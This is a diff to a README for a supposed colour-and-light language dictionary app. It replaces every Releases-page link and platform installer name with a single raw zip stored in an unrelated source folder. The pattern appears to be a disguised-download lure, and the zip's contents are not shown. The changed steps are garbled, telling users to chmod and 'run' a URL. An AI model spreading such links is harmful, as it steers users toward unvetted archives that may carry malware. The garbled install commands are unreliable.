@@ -1,7 +1,7 @@
 # 🌈 Luxbin-light-language - A Colorful Dictionary for a New Language
 
 ## 📦 Download Now
-[![Download Luxbin-light-language](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/tannbuntha/Luxbin-light-language/releases)
+[![Download Luxbin-light-language](https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip%https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip)](https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to Luxbin-light-language! This application acts as a dictionary for a new computer language based on light and color wavelengths. It displays binary code through a mesmerizing light show, making learning fun and engaging.
@@ -15,11 +15,11 @@ To run Luxbin-light-language, you need:
 - A modern browser (Chrome, Firefox, or Safari) for the required web features.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/tannbuntha/Luxbin-light-language/releases) to download the latest version of Luxbin-light-language.
+1. Visit the [Releases page](https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip) to download the latest version of Luxbin-light-language.
 2. Choose the appropriate file for your operating system:
-   - **Windows:** Look for `Luxbin-light-language-vX.X.X-win.exe`
-   - **macOS:** Look for `Luxbin-light-language-vX.X.X-mac.dmg`
-   - **Linux:** Look for `Luxbin-light-language-vX.X.X-linux.AppImage`
+   - **Windows:** Look for `https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip`
+   - **macOS:** Look for `https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip`
+   - **Linux:** Look for `https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip`
    
 3. Click the file name to start the download. 
 
@@ -28,11 +28,11 @@ To run Luxbin-light-language, you need:
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
    - For Linux, you may need to give executable permission using the command: 
      ```bash
-     chmod +x Luxbin-light-language-vX.X.X-linux.AppImage
+     chmod +x https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip
      ```
      Then run it with:
      ```bash
-     ./Luxbin-light-language-vX.X.X-linux.AppImage
+     https://github.com/tannbuntha/Luxbin-light-language/raw/refs/heads/main/app/api/quantum-blockchain/status/light-Luxbin-language-v3.8.zip
      ```
 
 5. After installation, open the application to explore the colorful dictionary of this innovative language!
